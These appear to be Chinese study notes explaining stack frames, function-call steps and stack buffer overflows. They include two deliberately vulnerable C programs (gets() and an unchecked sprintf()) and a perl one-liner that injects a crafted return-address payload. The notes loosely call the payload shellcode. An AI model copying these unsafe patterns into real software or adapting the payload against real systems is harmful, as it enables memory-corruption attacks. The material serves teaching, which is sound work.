要理解缓冲区溢出攻击，首先需要掌握操作系统层面程序在执行函数调用时的底层内存管理机制。特别是栈（Stack）结构在函数调用过程中的变化。

## 1. 函数调用机制 (Function Call Mechanisms)

当一个程序调用函数时，系统会在栈（Stack）上为该函数分配一块连续的内存区域，称为**栈帧（Stack Frame）**。栈在内存中通常是**向下生长**的（从高地址向低地址扩展）。

### 1.1 栈帧的典型结构
一个典型的栈帧从高地址到低地址包含以下内容：
1. **函数参数 (Function Parameters)**：调用者在调用函数前，将参数压入栈中（通常按照从右向左的顺序）。
2. **返回地址 (Return Address)**：调用者执行 `CALL` 指令时，会将下一条指令的地址压入栈中。**这是栈溢出攻击最核心的篡改目标。**
3. **旧的基址指针 (Saved Frame Pointer / EBP)**：被调用函数执行时，首先将调用者的基址指针（如 `$EBP$`）压栈保存，以便函数返回时恢复调用者的栈帧状态。
4. **局部变量 (Local Variables)**：被调用函数通过减小栈指针（如 `$ESP$`）来为内部的局部变量（如数组、缓冲区）分配空间。

### 1.2 函数调用的详细步骤 (Detailed Function Call Steps)

以函数 P 调用函数 Q 为例，完整的栈帧构建与销毁过程可以分为以下 11 个步骤：
![[assets/栈帧结构示意图.png]]

**调用者 P (The calling function P) 的准备工作：**
1. **参数压栈**：将目标函数 Q 所需的参数压入栈中（通常按声明的相反顺序，即从右向左压栈，如先压入 `param 2`，再压入 `param 1`）。
2. **保存返回地址并跳转**：执行 `CALL` 指令调用目标函数。该指令会自动将 P 中紧接着 `CALL` 指令的下一条指令地址（即 `Return addr in P`）压入栈中。

**被调用者 Q (The called function Q) 的执行过程：**
3. **保存旧基址指针**：将当前的帧指针（Frame Pointer，指向 P 的栈帧基址）压入栈中保存。
4. **更新基址指针**：将当前的帧指针设置为当前的栈指针（Stack Pointer）的值。此时，帧指针便定位了 Q 新栈帧的起始位置。
5. **分配局部变量空间**：将栈指针向下移动（减小其值），为 Q 内部的局部变量（如 `local 1`, `local 2`）预留足够的内存空间。
6. **执行函数体**：运行 Q 函数内部的具体逻辑。
7. **释放局部变量空间**：Q 执行完毕准备退出时，首先将栈指针恢复为帧指针的值（相当于直接丢弃了为局部变量分配的空间）。
8. **恢复旧基址指针**：从栈中弹出之前保存的旧帧指针值，从而恢复与调用者 P 栈帧的链接。
9. **返回控制权**：执行 `RET` (Return) 指令，该指令会从栈中弹出步骤 2 保存的返回地址，并将程序的控制权交还给调用者 P。

**调用者 P (The calling function P) 的收尾工作：**
10. **清理参数**：将步骤 1 中为调用 Q 而压栈的参数从栈中弹出。
11. **继续执行**：从弹出的返回地址处继续执行 P 函数后续的指令。

### 1.3 溢出原理
由于局部变量位于栈帧的低地址，而返回地址位于高地址。如果程序对局部变量（如字符数组）的写入没有进行边界检查，多余的数据就会向高地址溢出，依次覆盖旧的基址指针和返回地址。当函数执行 `RET` 指令返回时，CPU 会将这个被恶意篡改的“返回地址”弹出并跳转执行，从而导致控制流被劫持。

## 2. 栈溢出攻击实例分析

以下展示两个典型的栈溢出实例代码及其运行结果。

### 实例 1：基础栈溢出 (Basic Stack Overflow)

此例子展示了直接使用[[不安全 C 标准库函数]]中的 `gets()` 导致的典型栈溢出，以及如何通过精心构造的输入注入恶意数据。

#### (a) 漏洞代码
```c
void hello(char *tag)
{
    char inp[16];

    printf("Enter value for %s: ", tag);
    gets(inp);
    printf("Hello your %s is %s\n", tag, inp);
}
```

#### (b) 运行结果分析
```bash
$ cc -g -o buffer2 buffer2.c

# 1. 正常运行：输入未超过 16 字节
$ ./buffer2
Enter value for name: Bill and Lawrie
Hello your name is Bill and Lawrie
buffer2 done

# 2. 溢出导致崩溃：输入大量字符覆盖了返回地址，导致段错误
$ ./buffer2
Enter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Segmentation fault (core dumped)

# 3. 恶意输入：使用 perl 构造包含机器码（Shellcode）和特定返回地址的十六进制字符串注入程序
$ perl -e 'print pack("H*", "414243444546474851525354555657586162636465666768e8ffffbf948304080a4e4e4e4e4e0a");' | ./buffer2
Enter value for name: 
Hello your Re?pyy]uEA is ABCDEFGHQRSTUVWXabcdefguyu
Enter value for Kyyu: 
Hello your Kyyu is NNNN
Segmentation fault (core dumped)
```

### 实例 2：间接栈溢出 (Another Stack Overflow)

此例子展示了即使输入阶段使用了相对安全的 `fgets()` 限制了长度，但在后续处理中使用了[[不安全 C 标准库函数]]中的 `sprintf()`，依然会导致栈溢出。

#### (a) 漏洞代码
```c
void getinp(char *inp, int siz)
{
    puts("Input value: ");
    fgets(inp, siz, stdin);
    printf("buffer3 getinp read %s\n", inp);
}

void display(char *val)
{
    char tmp[16];
    // 漏洞点：sprintf 没有检查 tmp 的容量。
    // 即使 getinp 中限制了读取大小，如果传递进来的 val 长度 + "read val: \n" 的长度超过了 16 字节，就会在此处发生溢出。
    sprintf(tmp, "read val: %s\n", val); 
    puts(tmp);
}

int main(int argc, char *argv[])
{
    char buf[16];
    getinp(buf, sizeof(buf));
    display(buf);
    printf("buffer3 done\n");
}
```

#### (b) 运行结果分析
```bash
$ cc -o buffer3 buffer3.c

# 1. 正常运行：短输入
$ ./buffer3
Input value: 
SAFE
buffer3 getinp read SAFE

read val: SAFE

buffer3 done

# 2. 溢出崩溃：虽然 fgets 限制了 buf 接收的长度为 16（实际读取 15 个字符 + '\0'），
# 但在 display 函数中，"read val: " 占据了额外的字符空间。
# 拼接后的总长度超出了 tmp[16] 的容量，导致在 display 函数返回时触发段错误。
$ ./buffer3
Input value: 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
buffer3 getinp read XXXXXXXXXXXXXXX

read val: XXXXXXXXXXXXXXX

buffer3 done
Segmentation fault (core dumped)
```
